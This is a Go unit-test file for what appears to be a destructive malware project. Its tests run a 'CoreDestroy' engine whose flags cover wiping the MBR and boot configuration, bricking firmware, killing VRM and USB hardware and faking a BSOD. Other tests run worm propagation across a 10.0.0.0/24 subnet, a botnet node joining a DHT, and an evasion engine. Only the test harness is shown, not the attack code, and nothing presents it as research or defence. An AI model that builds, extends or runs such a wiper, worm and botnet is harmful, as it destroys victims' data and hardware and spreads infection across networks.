package v210

import (
	"context"
	"testing"
)

func TestDefaultV210Config(t *testing.T) {
	cfg := DefaultV210Config()
	if cfg == nil {
		t.Fatal("DefaultV210Config returned nil")
	}
	if cfg.Simulation != true {
		t.Error("Simulation should default to true")
	}
}

func TestNewV210Orchestrator(t *testing.T) {
	cfg := DefaultV210Config()
	vo := NewV210Orchestrator(cfg)
	if vo == nil {
		t.Fatal("NewV210Orchestrator() returned nil")
	}
}

func TestV210OrchestratorExecute(t *testing.T) {
	cfg := DefaultV210Config()
	vo := NewV210Orchestrator(cfg)
	cfg.Simulation = true

	result := vo.ExecuteAll(context.Background())
	if result == nil {
		t.Fatal("ExecuteAll returned nil")
	}
	t.Logf("V210 execution results: %v", result)
}

func TestV210GetFullStatusJSON(t *testing.T) {
	cfg := DefaultV210Config()
	vo := NewV210Orchestrator(cfg)
	_ = vo.ExecuteAll(context.Background())

	json := vo.GetFullStatusJSON()
	if json == "" {
		t.Error("GetFullStatusJSON returned empty")
	}
	t.Logf("V210 JSON (truncated): %.200s", json)
}

func TestNewCoreDestroyEngine(t *testing.T) {
	cfg := DefaultV210Config()
	cd := NewCoreDestroyEngine(cfg)
	if cd == nil {
		t.Fatal("NewCoreDestroyEngine() returned nil")
	}
}

func TestCoreDestroyExecuteAll(t *testing.T) {
	cfg := DefaultV210Config()
	cd := NewCoreDestroyEngine(cfg)
	cd.ExecuteAll()

	if cd.MBRDestroyed {
		t.Log("MBR destroyed flag set")
	}
	t.Logf("CoreDestroy: MBR=%v Firmware=%v BCD=%v VRM=%v USB=%v BSOD=%v",
		cd.MBRDestroyed, cd.FirmwareBricked, cd.BCDDestroyed,
		cd.VRMKilled, cd.USBKilled, cd.BSODFake)
}

func TestNewApocWormEngine(t *testing.T) {
	cfg := DefaultV210Config()
	aw := NewApocWormEngine(cfg)
	if aw == nil {
		t.Fatal("NewApocWormEngine() returned nil")
	}
}

func TestApocWormPropagate(t *testing.T) {
	cfg := DefaultV210Config()
	aw := NewApocWormEngine(cfg)

	infections := aw.Propagate("10.0.0.0/24")
	t.Logf("Worm infections: %d (expected 0 in test env)", infections)
}

func TestNewApocBotnetNode(t *testing.T) {
	cfg := DefaultV210Config()
	bn := NewApocBotnetNode(cfg)
	if bn == nil {
		t.Fatal("NewApocBotnetNode() returned nil")
	}
}

func TestApocBotnetNodeJoinDHT(t *testing.T) {
	cfg := DefaultV210Config()
	bn := NewApocBotnetNode(cfg)
	cfg.Simulation = true

	joined := bn.JoinDHT()
	t.Logf("Botnet DHT joined: %v (expected false in test env)", joined)
}

func TestNewApocCryptoLayer(t *testing.T) {
	cfg := DefaultV210Config()
	cl := NewApocCryptoLayer(cfg)
	if cl == nil {
		t.Fatal("NewApocCryptoLayer() returned nil")
	}
}

func TestApocCryptoLayerGenerateKEM(t *testing.T) {
	cfg := DefaultV210Config()
	cl := NewApocCryptoLayer(cfg)

	pub, sec := cl.GenerateHybridKEM()
	if len(pub) == 0 || len(sec) == 0 {
		t.Log("Hybrid KEM keys empty (expected if no kyber lib)")
	} else {
		t.Logf("KEM: pub=%d bytes, sec=%d bytes", len(pub), len(sec))
	}
}

func TestNewApocExtraIdeas(t *testing.T) {
	cfg := DefaultV210Config()
	ae := NewApocExtraIdeas(cfg)
	if ae == nil {
		t.Fatal("NewApocExtraIdeas() returned nil")
	}
}

func TestApocExtraIdeasExecuteAll(t *testing.T) {
	cfg := DefaultV210Config()
	ae := NewApocExtraIdeas(cfg)
	ae.ExecuteAll()
	t.Log("Extra ideas executed without panic")
}

func TestNewPhantomEvasionEngine(t *testing.T) {
	cfg := DefaultV210Config()
	pe := NewPhantomEvasionEngine(cfg)
	if pe == nil {
		t.Fatal("NewPhantomEvasionEngine() returned nil")
	}
}

func TestPhantomEvasionCheck(t *testing.T) {
	cfg := DefaultV210Config()
	pe := NewPhantomEvasionEngine(cfg)

	status := pe.GetStatus()
	if len(status) == 0 {
		t.Log("Phantom evasion status empty (expected in test env)")
	} else {
		t.Logf("Phantom status: %v", status)
	}
}
